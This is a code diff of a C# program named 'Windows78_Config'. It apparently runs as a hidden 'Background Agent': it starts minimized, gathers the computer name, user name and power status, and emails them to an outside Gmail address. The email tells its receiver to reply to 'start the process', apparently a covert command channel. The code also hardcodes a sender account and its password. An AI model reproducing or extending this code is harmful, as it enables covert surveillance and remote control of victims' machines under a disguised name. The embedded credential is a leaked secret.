@@ -53,6 +53,7 @@ namespace Windows78_Config
         private bool stopsignal;
         private String pathString;
         private String EmailReceiver = "zerdyax@gmail.com";
+        private string PCName;
         public Main()
         {
             this.WindowState = FormWindowState.Minimized;
@@ -275,7 +276,7 @@ namespace Windows78_Config
                 PowerlineStatus = status.PowerLineStatus.ToString();
 
                 //ComputerName
-                string PCName = System.Windows.Forms.SystemInformation.ComputerName;
+                PCName = System.Windows.Forms.SystemInformation.ComputerName;
                 string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
 
 
@@ -350,7 +351,7 @@ namespace Windows78_Config
             var fromAddress = new MailAddress("prof.shitpost420@gmail.com", "Background Agent");
             var toAddress = new MailAddress(EmailReceiver, "Me");
             const string fromPassword = "knxyrkzjjanaygoi";
-            const string subject = "Agent Setup Information";
+            const string subject = "Agent Setup Information - New Detection";
 
             string text = "A New execution has been detected." + Environment.NewLine + 
                 "Reply to this E-Mail to start the process, ignore it and it will remain on Standby" + Environment.NewLine + Environment.NewLine + 
